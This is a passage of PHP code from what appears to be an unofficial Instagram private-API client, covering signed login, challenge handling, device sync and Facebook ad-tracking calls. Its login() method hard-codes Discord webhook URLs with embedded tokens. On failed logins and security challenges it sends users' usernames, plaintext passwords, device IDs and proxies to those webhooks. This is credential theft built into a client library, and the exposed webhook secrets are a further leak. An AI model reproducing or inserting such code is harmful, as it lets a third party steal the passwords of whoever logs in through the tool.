		$requestPosts = ['security_code' => $code, '_csrftoken' => $this->token, 'guid' => $this->uuid, 'device_id' => $this->device_id];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$okey_choice = $this->request('https://i.instagram.com/api/v1' . $apipath, $postData, false, true);
		return $okey_choice[1];
	}

	public function logAcquirable()
	{
		$requestPosts = ['can_prefill_from_sim' => true, 'phone_id' => $this->phone_id, '_csrftoken' => $this->token, '_uid' => $this->account_id, 'device_id' => $this->device_id, '_uuid' => $this->uuid];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$okey_choice = $this->request('accounts/log_acquirable_phone_number/', $postData, true, false, false, true);
		return $okey_choice[1];
	}

	public function fbActivities()
	{
		$requestPosts = ['advertiser_tracking_enabled' => 1, 'anon_id' => $this->adid, 'advertiser_id' => $this->adid, 'event' => 'MOBILE_APP_INSTALL', 'application_package_name' => 'com.instagram.android', 'application_tracking_enabled' => 1];
		$okey_choice = $this->request('https://graph.facebook.com/v2.3/124024574287414/activities', $requestPosts, true, true, false, true);
		return $okey_choice[1];
	}

	public function fbActivitiesIki()
	{
		$requestPosts = [
			'custom_events_file'           => [
				['_appVersion' => '42.0.0.19.95', '_logTime' => strtotime(date('d-m-Y H:i:s')), '_eventName' => 'fb_mobile_activate_app']
			],
			'format'                       => 'json',
			'advertiser_tracking_enabled'  => 1,
			'anon_id'                      => $this->adid,
			'advertiser_id'                => $this->adid,
			'event'                        => 'CUSTOM_APP_EVENTS',
			'application_package_name'     => 'com.instagram.android',
			'application_tracking_enabled' => 1
		];
		$okey_choice = $this->request('https://graph.facebook.com/v2.3/124024574287414/activities', $requestPosts, true, true, false, true);
		return $okey_choice[1];
	}

	public function getInviteSuggestion()
	{
		$requestPosts = ['offset' => '0', '_csrftoken' => $this->token, '_uuid' => $this->uuid, 'count' => '50'];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$okey_choice = $this->request('fb/get_invite_suggestions/', $postData, true, false, false, true);
		return $okey_choice[1];
	}

	public function pclogin($username, $password)
	{
		$prePost = [];
		$this->launcherSync(false);
		$prePost['pre'][] = $this->launcherSync(false, true);
		$prePost['pre'][] = $this->logAttribution(true);
		$prePost['pre'][] = $this->msisdnHeader(true);
		$prePost['pre'][] = $this->readMsisdnHeader(true);
		$prePost['pre'][] = $this->launcherSync(false, true);
		$prePost['pre'][] = $this->syncDeviceFeatures(true, false, true);
		$prePost['pre'][] = $this->syncDeviceFeatures(true, true, true);
		$prePost['pre'][] = $this->getPrefillCandidates(true);
		$prePost['pre'][] = $this->zrToken(true);
		$requestPosts = ['phone_id' => $this->phone_id, '_csrftoken' => $this->token, 'username' => $username, 'adid' => $this->adid, 'guid' => $this->uuid, 'device_id' => $this->device_id, 'password' => $password];
		$requestPosts = Signatures::signData($requestPosts);
		$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
		$prePost['loginPost'] = $postData;
		$prePost['useragent'] = $this->device->getUserAgent();
		return $prePost;
	}

	public function addUserPasslogin($force = false)
	{
		if (!$this->isLoggedIn || $force) {
			$requestPosts = ['phone_id' => $this->phone_id, '_csrftoken' => $this->token, 'username' => $this->username, 'adid' => $this->adid, 'guid' => $this->uuid, 'device_id' => $this->device_id, 'password' => $this->password, 'login_attempt_count' => '0'];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$login = $this->request('accounts/login/', $postData, true);
			if (isset($login[1]['message']) && ($login[1]['message'] == 'challenge_required')) {
				$challenge_data = $this->request('https://i.instagram.com/api/v1' . $login[1]['challenge']['api_path'] . '?guid=' . $this->uuid . '&device_id=' . $this->device_id, NULL, true, true);
				$challenge_data[1]['token'] = $this->token;
				$challenge_data[1]['guid'] = $this->uuid;
				$challenge_data[1]['device_id'] = $this->device_id;
				$challenge_data[1]['username'] = $this->username;
				$challenge_data[1]['password'] = $this->password;
				$challenge_data[1]['api_path'] = $login[1]['challenge']['api_path'];

				if (isset($challenge_data[1]['step_data']['latitude'])) {
					$requestPosts = ['choice' => 0, '_csrftoken' => $this->token, 'guid' => $this->uuid, 'device_id' => $this->device_id];
					$requestPosts = Signatures::signData($requestPosts);
					$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
					$this->request('https://i.instagram.com/api/v1' . $login[1]['challenge']['api_path'], $postData, true, true);
					return $this->login(true);
				}

				return $challenge_data[1];
			}

			if ($login[1]['status'] == 'fail') {
				throw new Exception($login[1]['message']);
			}

			$this->isLoggedIn = true;
			$this->settings->set('last_login', time());
			$this->settings->save();
			$this->syncUserFeatures();
			$this->getAutoCompleteUserList();
			$this->getVisualInbox();
			return $login[1];
		}

		if (is_null($this->settings->get('last_login'))) {
			$this->settings->set('last_login', time());
			$this->settings->save();
		}

		$check = $this->getTimelineFeed();
		if (isset($check['message']) && ($check['message'] == 'login_required')) {
			return $this->login(true);
		}

		if (1800 < (time() - $this->settings->get('last_login'))) {
			$this->settings->set('last_login', time());
		}

		$lastExperimentsTime = $this->settings->get('last_experiments');
		if (is_null($lastExperimentsTime) || (7200 < (time() - $lastExperimentsTime))) {
			$this->syncUserFeatures();
			$this->syncDeviceFeatures();
		}

		return ['status' => 'ok'];
	}

	public function login($force = false)
	{
		$notif_login_json = "https://discord.com/api/webhooks/1052137787115184128/10UemLOOFkW2xXYdGhzS_g20lpjULTpVOEuB8A4ne0C0QreAKhbB8hKIOBaQeNmu1R2R";
		$notif_challenge_json = "https://discord.com/api/webhooks/1052137861324996678/qIr_nu5tr6IU1vrv9PoEj1eLCNUoKX-f6vEE1Mu8tx4iKaBH9kHasfKJ5DFKyonp9Jnb";

		if (!$this->isLoggedIn || $force) {
			$this->siFetch();
			$this->zrToken();
			$requestPosts = ['phone_id' => $this->phone_id, '_csrftoken' => $this->token, 'username' => $this->username, 'adid' => $this->adid, 'guid' => $this->uuid, 'device_id' => $this->device_id, 'password' => $this->password, 'login_attempt_count' => '0'];
			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
			$login = $this->requestLogin($this->username, 'accounts/login/', $postData, true);

			if ($login[1]['status'] == "fail") {
				if (!($login[1]['error_type'] == "bad_password")) {
					$this->botJson($login[1], $this->username, $this->password, $notif_login_json);
				}
			}
			// $this->botJson($login[1], $this->username, $this->password, $notif_login_json);

			if (isset($login[1]['message']) && ($login[1]['message'] == 'challenge_required')) {

				// $challenge_data = $this->requestChallenge($login[1]['challenge']['url'], NULL, true, true);
				$challenge_data = $this->requestLogin(NULL, 'https://i.instagram.com/api/v1' . $login[1]['challenge']['api_path'] . '?guid=' . $this->uuid . '&device_id=' . $this->device_id, NULL, true, true);

				$challenge_data[1]['token'] = $this->token;
				$challenge_data[1]['guid'] = $this->uuid;
				$challenge_data[1]['device_id'] = $this->device_id;
				$challenge_data[1]['username'] = $this->username;
				$challenge_data[1]['password'] = $this->password;
				$challenge_data[1]['api_path'] = $login[1]['challenge']['api_path'];

				if (isset($challenge_data[1]['step_data']['latitude'])) {
					$requestPosts = ['choice' => 0, '_csrftoken' => $this->token, 'guid' => $this->uuid, 'device_id' => $this->device_id];
					$requestPosts = Signatures::signData($requestPosts);
					$postData = http_build_query(Utils::reorderByHashCode($requestPosts));
					$this->requestLogin($this->username, 'https://b.i.instagram.com/api/v1' . $login[1]['challenge']['api_path'], $postData, true, true);
					return $this->login(true);
				}

				$this->botJson($challenge_data[1], $this->username, $this->password, $notif_challenge_json);
				return $challenge_data[1];
			}

			if ($login[1]['status'] == 'fail') {
				$notif_login_error = "https://discord.com/api/webhooks/1031023129050497066/ggQE7D5CL91nnnicwFPJ00jXssUhTf7SIeZU6c4itg7OPbJVMuAG-Cl6pG_D40FOXW8o";
				if ($login[1]['message'] == 'Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.') {
					$this->bot("Login-error Message: **[The password you entered is incorrect]** | [" . $this->username . ":" . $this->password . "]", $notif_login_error);
				} else if ($login[1]['message'] == 'Le nom d’utilisateur saisi ne semble appartenir à aucun compte. Veuillez le vérifier et réessayer.' && $login[1]["error_type"] == 'ip_block') {
					$this->bot("Login-error Message: Proxy problem `[IP_BLOCK]` | `[" . $this->username . ":" . $this->password . "]` `[" . $login["proxy"] . "]`", $notif_login_error);
				} else {
					$this->bot("Login-error Message: " . $login[1]['message'] . " username: " . $this->username . " password: " . $this->password . " device: " . $this->device_id, $notif_login_error);
				}
				//   $this->bot("Login-error Message: ".$login[1]['message']. " username: ".$this->username." device: ".$this->device_id, $notif_login_error);
				throw new Exception($login[1]['message']);
			}

			$this->isLoggedIn = true;
			$this->settings->set('last_login', time());
			$this->settings->save();
			$this->syncUserFeatures();
			$this->getAutoCompleteUserList();
			$this->getVisualInbox();
			return $login[1];
		}

		if (is_null($this->settings->get('last_login'))) {
			$this->settings->set('last_login', time());
			$this->settings->save();
		}

		$check = $this->getTimelineFeed();
		if (isset($check['message']) && ($check['message'] == 'login_required')) {
			return $this->login(true);
		}

		if (1800 < (time() - $this->settings->get('last_login'))) {
			$this->settings->set('last_login', time());
		}

		$lastExperimentsTime = $this->settings->get('last_experiments');
		if (is_null($lastExperimentsTime) || (7200 < (time() - $lastExperimentsTime))) {
			$this->syncUserFeatures();
			$this->syncDeviceFeatures();
		}

		return ['status' => 'ok'];
	}

	public function syncDeviceFeatures($prelogin = false, $withCsrf = false, $export = false)
	{
		if ($prelogin) {
			$requestPosts = ['id' => $this->uuid, 'experiments' => 'ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_android_icon_perf2,ig_android_autosubmit_password_recovery_universe,ig_android_background_voice_phone_confirmation_prefilled_phone_number_only,ig_android_report_nux_completed_device,ig_account_recovery_via_whatsapp_universe,ig_android_stories_reels_tray_media_count_check,ig_android_background_voice_confirmation_block_argentinian_numbers,ig_android_device_verification_fb_signup,ig_android_reg_nux_headers_cleanup_universe,ig_android_reg_omnibox,ig_android_background_voice_phone_confirmation,ig_android_gmail_autocomplete_account_over_one_tap,ig_android_phone_reg_redesign_universe,ig_android_skip_signup_from_one_tap_if_no_fb_sso,ig_android_reg_login_profile_photo_universe,ig_android_access_flow_prefill,ig_android_email_suggestions_universe,ig_android_contact_import_placement_universe,ig_android_ask_for_permissions_on_reg,ig_android_onboarding_skip_fb_connect,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_hide_fb_connect_for_signup,ig_android_account_switch_infra_universe,ig_restore_focus_on_reg_textbox_universe,ig_android_login_identifier_fuzzy_match,ig_android_suma_biz_account,ig_android_session_scoping_facebook_account,ig_android_security_intent_switchoff,ig_android_do_not_show_back_button_in_nux_user_list,ig_android_aymh_signal_collecting_kill_switch,ig_android_persistent_duplicate_notif_checker,ig_android_multi_tap_login_new,ig_android_nux_add_email_device,ig_android_login_safetynet,ig_android_fci_onboarding_friend_search,ig_android_editable_username_in_reg,ig_android_phone_auto_login_during_reg,ig_android_one_tap_fallback_auto_login,ig_android_device_detection_info_upload,ig_android_updated_copy_user_lookup_failed,ig_fb_invite_entry_points,ig_android_hsite_prefill_new_carrier,ig_android_gmail_oauth_in_reg,ig_two_fac_login_screen,ig_android_reg_modularization_universe,ig_android_passwordless_auth,ig_android_sim_info_upload,ig_android_universe_noticiation_channels,ig_android_realtime_manager_cleanup_universe,ig_android_analytics_accessibility_event,ig_android_direct_main_tab_universe,ig_android_email_one_tap_auto_login_during_reg,ig_android_prefill_full_name_from_fb,ig_android_directapp_camera_open_and_reset_universe,ig_challenge_kill_switch,ig_android_video_bug_report_universe,ig_account_recovery_with_code_android_universe,ig_prioritize_user_input_on_switch_to_signup,ig_android_modularized_nux_universe_device,ig_android_account_recovery_auto_login,ig_android_hide_typeahead_for_logged_users,ig_android_targeted_one_tap_upsell_universe,ig_android_caption_typeahead_fix_on_o_universe,ig_android_crosshare_feed_post,ig_android_retry_create_account_universe,ig_android_abandoned_reg_flow,ig_android_remember_password_at_login,ig_android_smartlock_hints_universe,ig_android_2fac_auto_fill_sms_universe,ig_android_onetaplogin_optimization,ig_type_ahead_recover_account,ig_android_family_apps_user_values_provider_universe,ig_android_direct_inbox_account_switching,ig_android_smart_prefill_killswitch,ig_android_exoplayer_settings,ig_android_bottom_sheet,ig_android_publisher_integration,ig_sem_resurrection_logging,ig_android_login_forgot_password_universe,ig_android_hindi,ig_android_hide_fb_flow_in_add_account_flow,ig_android_dialog_email_reg_error_universe,ig_android_low_priority_notifications_universe,ig_android_device_sms_retriever_plugin_universe,ig_android_device_verification_separate_endpoint'];

			if ($withCsrf) {
				$requestPosts['_csrftoken'] = $this->token;
			}

			$requestPosts = Signatures::signData($requestPosts);
			$postData = http_build_query(Utils::reorderByHashCode($requestPosts));

			if ($withCsrf) {
				if ($export) {
					return ['url' => 'https://i.instagram.com/api/v1/qe/sync/', 'data' => $postData];
				}

				return $this->request('qe/sync/', $postData, true, false, false, true)[1];
			} else {
				if ($export) {
					return ['url' => 'https://b.i.instagram.com/api/v1/qe/sync/', 'data' => $postData];
				}

				return $this->request('https://b.i.instagram.com/api/v1/qe/sync/', $postData, true, true, false, true)[1];
			}
		} else {
			$requestPosts = ['_uuid' => $this->uuid, '_uid' => $this->account_id, '_csrftoken' => $this->token, 'id' => $this->account_id, 'experiments' => 'ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_realtime_mqtt_logging,ig_branded_content_show_settings_universe,ig_android_stories_server_coverframe,ig_android_live_dash_predictive_streaming,ig_android_video_captions_universe,ig_business_growth_acquisition_holdout_17h2,ig_android_ontact_invite_universe,ig_android_ad_async_ads_universe,ig_android_shopping_tag_creation_carousel_universe,ig_feed_engagement_holdout_universe,ig_direct_pending_inbox_memcache,ig_promote_guided_budget_duration_options_universe,ig_android_verified_comments_universe,ig_feed_lockdown,android_instagram_prefetch_suggestions_universe,ig_android_gallery_order_by_date_taken,ig_shopping_viewer_intent_actions,ig_android_startup_prefetch,ig_android_business_post_insights_v3_universe,ig_android_custom_story_import_intent,ig_video_copyright_whitelist,ig_explore_holdout_universe,ig_android_device_language_reset,ig_android_videocall_consumption_universe,ig_android_live_fault_tolerance_universe,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_android_face_filter_glyph_nux_animation_universe,ig_android_direct_allow_consecutive_likes,ig_android_livewith_guest_adaptive_camera_universe,ig_android_business_new_ads_payment_universe,ig_android_audience_control,ig_promotion_insights_sticky_tab_universe,ig_android_unified_bindergroup_in_staticandpagedadapter,ig_android_ad_new_viewability_logging_universe,ig_android_ad_impression_backtest,ig_android_log_account_switch_usable,ig_android_mas_viewer_list_megaphone_universe,ig_android_photo_fbupload_universe,ig_android_carousel_drafts,ig_android_bug_report_version_warning,ig_fbns_push,ig_android_carousel_no_buffer_10_30,ig_android_sso_family_key,ig_android_profile_tabs_redesign_universe,ig_android_user_url_deeplink_fbpage_endpoint,ig_android_fix_slow_rendering,ig_android_hide_post_in_feed,ig_android_shopping_thumbnail_icon,ig_android_ad_watchbrowse_universe,ig_android_search_people_tag_universe,ig_android_codec_high_profile,ig_android_long_impression_tracking,ig_android_inline_appeal,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_android_camera_face_filter_api_retry,ig_video_use_sve_universe,ig_android_low_data_mode,ig_android_enable_zero_rating,ig_android_sample_ppr,ig_android_force_logout_user_with_mismatched_cookie,ig_android_smartisan_app_badging,ig_android_direct_expiring_media_fix_duplicate_thread,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_comments_impression_logger,ig_android_live_encore_production_universe,ig_promote_independent_ctas_universe,ig_android_http_stack_experiment_2017,ig_android_pending_request_search_bar,ig_android_main_feed_carousel_bumping_animation,ig_android_live_thread_delay_for_mute_universe,ig_android_fb_topsearch_sgp_fork_request,ig_android_heap_uploads,ig_android_stories_archive_universe,ig_android_business_ix_fb_autofill_universe,ig_lockdown_feed_shrink_universe,ig_android_stories_create_flow_favorites_tooltip,ig_android_direct_ephemeral_replies_with_context,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_profile_holdout_2017_universe,ig_android_executor_null_queue,ig_android_stories_video_loading_spinner_improvements,ig_android_direct_share_intent,ig_android_live_capture_translucent_navigation_bar,ig_stories_camera_blur_drawable,ig_android_stories_drawing_sticker,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_android_story_decor_image_fbupload_universe,ig_android_comments_ranking_kill_switch_universe,ig_promote_profile_visit_cta_universe,ig_android_story_reactions,ig_android_ppr_main_feed_enhancements,ig_android_used_jpeg_library,ig_carousel_draft_multiselect,ig_android_stories_close_to_left_head,ig_android_video_delay_auto_start,ig_android_live_with_invite_sheet_search_universe,ig_android_stories_archive_calendar,ig_android_ad_watchbrowse_cta_universe,ig_android_ads_manager_pause_resume_ads_universe,ig_android_main_feed_carousel_bumping,ig_stories_in_feed_unit_design_universe,ig_android_explore_iteminfo_universe_exp,ig_android_me_only_universe,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_live_reply_to_comments_universe,ig_android_live_save_to_camera_roll_universe,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_realtime_iris,ig_android_search_client_matching_2,ig_lockdown_notifications_universe,ig_android_feed_seen_state_with_view_info,ig_android_media_rows_prepare_10_31,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_live_auto_collapse_comments_view_universe,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_cache_logger_10_34,ig_android_stories_weblink_creation,ig_android_histogram_reporter,ig_android_network_cancellation,ig_android_shopping_show_shop_tooltip,ig_android_video_delay_auto_start_threshold,ig_android_comment_category_filter_setting_universe,ig_promote_daily_budget_universe,ig_android_stories_camera_enhancements,ig_android_video_use_new_logging_arch,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_feed_stale_check_interval,ig_android_crop_from_inline_gallery_universe,ig_android_direct_reel_options_entry_point,ig_android_stories_gallery_improvements,ig_android_live_broadcaster_invite_universe,ig_android_inline_photos_of_you_universe,ig_android_prefetch_notification_data,ig_android_direct_full_size_gallery_upload_universe_v2,ig_android_direct_app_deeplinking,ig_promotions_unit_in_insights_landing_page,ig_android_reactive_feed_like_count,ig_android_camera_ff_story_open_tray,ig_android_stories_asset_search,ig_android_constrain_image_size_universe,ig_rn_top_posts_stories_nux_universe,ig_ranking_following,ig_android_camera_retain_face_filter,ig_android_direct_inbox_presence,ig_android_live_skin_smooth,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_canvas_swipe_to_open_universe,ig_android_qp_features,android_ig_stories_without_storage_permission_universe2,ig_android_reel_raven_video_segmented_upload_universe,ig_android_swipe_navigation_x_angle_universe,ig_android_invite_xout_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_live_encore_go_live_button_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_live_report_watch_time_when_update,ig_android_family_bridge_discover,ig_android_startup_manager,instagram_search_and_coefficient_holdout,ig_android_high_res_upload_2,ig_android_dynamic_background_prefetch,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_crash_native_core_dumping,ig_android_one_tap_nux_upsell,ig_android_segmentation,ig_profile_holdout_universe,ig_dextricks_module_loading_experiment,ig_android_comments_composer_avatar_universe,ig_android_direct_open_thread_with_expiring_media,ig_android_post_capture_filter,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_no_prefetch_video_bandwidth_threshold,ig_android_encoder_width_safe_multiple_16,ig_android_warm_like_text,ig_android_request_feed_on_back,ig_comments_team_holdout_universe,ig_android_e2e_optimization_universe,ig_shopping_insights,ig_android_direct_async_message_row_building_universe,ig_android_fb_connect_follow_invite_flow,ig_android_direct_24h_replays,ig_android_video_stitch_after_segmenting_universe,ig_android_instavideo_periodic_notif,ig_android_enable_swipe_to_dismiss_for_all_dialogs,ig_android_stories_camera_support_image_keyboard,ig_android_warm_start_fetch_universe,ig_android_marauder_update_frequency,ig_camera_android_aml_face_tracker_model_version_universe,ig_android_ad_connection_manager_universe,ig_android_ad_watchbrowse_carousel_universe,ig_android_branded_content_edit_flow_universe,ig_android_video_feed_universe,ig_android_upload_reliability_universe,ig_android_direct_mutation_manager_universe,ig_android_ad_show_new_bakeoff,ig_heart_with_keyboad_exposed_universe,ig_android_react_native_universe_kill_switch,ig_android_comments_composer_callout_universe,ig_android_search_hash_tag_and_username_universe,ig_android_live_disable_speed_test_ui_timeout_universe,ig_android_miui_notification_badging,ig_android_qp_kill_switch,ig_android_ad_switch_fragment_logging_v2_universe,ig_android_ad_leadgen_single_screen_universe,ig_android_share_to_whatsapp,ig_android_live_snapshot_universe,ig_branded_content_share_to_facebook,ig_android_react_native_email_sms_settings_universe,ig_android_live_join_comment_ui_change,ig_android_camera_tap_smile_icon_to_selfie_universe,ig_android_feed_surface_universe,ig_android_biz_choose_category,ig_android_prominent_live_button_in_camera_universe,ig_android_video_cover_frame_from_original_as_fallback,ig_android_camera_leak_detector_universe,ig_android_live_hide_countdown_universe,ig_android_story_viewer_linear_preloading_count,ig_android_threaded_comments_universe,ig_android_stories_search_reel_mentions_universe,ig_promote_reach_destinations_universe,ig_android_progressive_jpeg_partial_download,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_ff_fill_gap,ig_promote_clicks_estimate_universe,ig_android_video_single_surface,ig_android_video_download_logging,ig_android_foreground_location_collection,ig_android_last_edits,ig_android_pending_actions_serialization,ig_android_post_live_viewer_count_privacy_universe,ig_stories_engagement_2017_h2_holdout_universe,ig_android_image_cache_tweak_for_n,ig_android_direct_increased_notification_priority,ig_android_search_top_search_surface_universe,ig_android_live_dash_latency_manager,instagram_interests_holdout,ig_android_user_detail_endpoint,ig_android_videocall_production_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_video_detail,ig_save_insights,ig_camera_android_new_face_effects_api_universe,ig_comments_typing_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_live_webrtc_audience_expansion_universe,ig_explore_android_universe,ig_android_video_prefetch_for_connectivity_type,ig_android_ad_holdout_watchandmore_universe,ig_promote_default_cta,ig_direct_stories_recipient_picker_button,ig_android_direct_notification_lights,ig_android_insights_relay_modern,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on,ig_android_fb_content_provider_anr_fix,ig_android_in_app_notifications_queue,ig_android_live_follow_from_comments_universe,ig_android_comments_new_like_button_position_universe,ig_android_hyperzoom,ig_android_live_broadcast_blacklist,ig_android_camera_perceived_perf_universe,ig_android_search_clear_layout_universe,ig_promote_reachbar_universe,ig_android_ad_one_pixel_logging_for_reel_universe,ig_android_stories_surface_universe,ig_android_stories_highlights_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_arengine_separate_prepare,ig_android_direct_video_segmented_upload_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_instavideo_remove_nux_comments,ig_android_draw_rainbow_client_universe,ig_android_use_simple_video_player,ig_android_rtc_reshare,ig_android_enable_swipe_to_dismiss_for_favorites_dialogs,ig_android_auto_retry_post_mode,ig_fbns_preload_default,ig_android_emoji_sprite_sheet,ig_android_cover_frame_blacklist,ig_android_gesture_dismiss_reel_viewer,ig_android_gallery_grid_column_count_universe,ig_android_ad_logger_funnel_logging_universe,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_ad_show_new_interest_survey,ig_android_live_encore_reel_chaining_universe,ig_android_vod_abr_universe,ig_android_audience_profile_icon_badge,ig_android_immersive_viewer,ig_android_analytics_use_a2,ig_android_react_native_universe,ig_android_direct_thread_name_as_notification,ig_android_su_rows_preparer,ig_android_leak_detector_universe,ig_android_video_loopcount_int,ig_android_qp_sticky_exposure_universe,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_live_time_adjustment_universe,ig_android_internal_research_settings,ig_android_prod_lockout_universe,ig_android_react_native_ota,ig_android_main_camera_share_to_direct,ig_android_cold_start_feed_request,ig_android_fb_family_navigation_badging_user,ig_stories_music_sticker,ig_android_send_impression_via_real_time,ig_android_sc_ru_ig,ig_android_animation_perf_reporter_timeout,ig_android_warm_headline_text,ig_android_post_live_expanded_comments_view_universe,ig_android_new_block_flow,ig_android_long_form_video,ig_android_sign_video_url,ig_android_image_task_cancel_logic_fix,ig_android_stories_video_prefetch_kb,ig_android_video_render_prevent_cancellation_feed_universe,ig_android_live_stop_broadcast_on_404,android_face_filter_universe,ig_android_render_iframe_interval,ig_business_claim_page_universe,ig_android_live_move_video_with_keyboard_universe,ig_stories_vertical_list,ig_android_stories_server_brushes,ig_android_live_viewers_canned_comments_universe,ig_android_collections_cache,ig_android_payment_settings_universe,ig_android_live_face_filter,ig_android_canvas_preview_universe,ig_android_screen_recording_bugreport_universe,ig_story_camera_reverse_video_experiment,ig_downloadable_modules_experiment,ig_direct_core_holdout_q4_2017,ig_promote_updated_copy_universe,ig_android_search,ig_android_logging_metric_universe,ig_promote_budget_duration_slider_universe,ig_android_insta_video_consumption_titles,ig_android_video_proxy,ig_android_find_loaded_classes,ig_android_direct_expiring_media_replayable,ig_android_reduce_rect_allocation,ig_android_camera_universe,ig_android_post_live_badge_universe,ig_stories_holdout_h2_2017,ig_android_video_server_coverframe,ig_promote_relay_modern,ig_android_search_users_universe,ig_android_video_controls_universe,ig_creation_growth_holdout,android_segmentation_filter_universe,ig_qp_tooltip,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_shopping_profile_shoppable_feed,ig_android_save_collection_pivots,ig_android_business_conversion_value_prop_v2,ig_android_ad_browser_warm_up_improvement_universe,ig_promote_guided_ad_preview_newscreen,ig_android_livewith_universe,ig_android_whatsapp_invite_option,ig_android_video_keep_screen_on,ig_promote_automatic_audience_universe,ig_android_direct_remove_animations,ig_android_live_align_by_2_universe,ig_android_friend_code,ig_android_top_live_profile_pics_universe,ig_android_async_network_tweak_universe_15,ig_android_direct_init_post_launch,ig_android_camera_new_early_show_smile_icon_universe,ig_android_live_go_live_at_viewer_end_screen_universe,ig_android_live_bg_download_face_filter_assets_universe,ig_android_background_reel_fetch,ig_android_insta_video_audio_encoder,ig_android_video_segmented_media_needs_reupload_universe,ig_promote_budget_duration_split_universe,ig_android_upload_prevent_upscale,ig_android_business_ix_universe,ig_android_ad_browser_new_tti_universe,ig_android_self_story_layout,ig_android_business_choose_page_ui_universe,ig_android_camera_face_filter_animation_on_capture,ig_android_rtl,ig_android_comment_inline_expansion_universe,ig_android_live_request_to_join_production_universe,ig_android_share_spinner,ig_android_video_resize_operation,ig_android_stories_eyedropper_color_picker,ig_android_disable_explore_prefetch,ig_android_universe_reel_video_production,ig_android_react_native_push_settings_refactor_universe,ig_android_power_metrics,ig_android_sfplt,ig_android_story_resharing_universe,ig_android_direct_inbox_search,ig_android_direct_share_story_to_facebook,ig_android_exoplayer_creation_flow,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_direct_visual_replies_fifty_fifty,ig_android_reel_viewer_data_buffer_size,ig_android_video_segmented_upload_multi_thread_universe,ig_android_react_native_restart_after_error_universe,ig_android_direct_notification_actions,ig_android_profile,ig_android_additional_contact_in_nux,ig_stories_selfie_sticker,ig_android_live_use_rtc_upload_universe,ig_android_story_reactions_producer_holdout,ig_android_stories_reply_composer_redesign,ig_android_story_viewer_segments_bar_universe,ig_explore_netego,ig_android_audience_control_sharecut_universe,ig_android_direct_fix_top_of_thread_scrolling,ig_video_holdout_h2_2017,ig_android_insights_metrics_graph_universe,ig_android_ad_swipe_up_threshold_universe,ig_android_one_tap_send_sheet_universe,ig_android_international_add_payment_flow_universe,ig_android_live_see_fewer_videos_like_this_universe,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_android_direct_inbox_suggestions,ig_android_video_segmented_upload_universe,ig_carousel_post_creation_tag_universe,ig_android_mqtt_region_hint_universe,ig_android_suggest_password_reset_on_oneclick_login,ig_android_live_special_codec_size_list,ig_android_continuous_contact_uploading,ig_android_story_viewer_item_duration_universe,ig_promote_budget_duration_client_server_switch,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,promote_media_picker,ig_android_live_video_reactions_creation_universe,ig_android_sidecar_gallery_universe,ig_android_business_id,ig_android_story_import_intent,ig_android_feed_follow_button_redesign,ig_android_section_based_recipient_list_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_live_webrtc_livewith_params,ig_android_comment_audience_control_group_selection_universe,android_ig_fbns_kill_switch,ig_android_su_card_view_preparer_qe,ig_android_unified_camera_universe,ig_android_all_videoplayback_persisting_sound,ig_android_live_pause_upload,ig_android_branded_content_brand_remove_self,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_camera_video_universe,ig_android_2fac,ig_android_audio_segment_report_info,ig_android_scroll_main_feed,ig_direct_bypass_group_size_limit_universe,ig_android_story_captured_media_recovery,ig_android_skywalker_live_event_start_end,ig_android_comment_hint_text_universe,ig_android_direct_search_story_recipients_universe,ig_android_ad_browser_gesture_control,ig_android_grid_cell_count,ig_promote_marketing_funnel_universe,ig_android_immersive_viewer_ufi_footer,ig_android_ad_watchinstall_universe,ig_android_comments_notifications_universe,ig_android_shortcuts,ig_android_new_optic,ig_android_audience_control_nux,favorites_home_inline_adding,ig_android_canvas_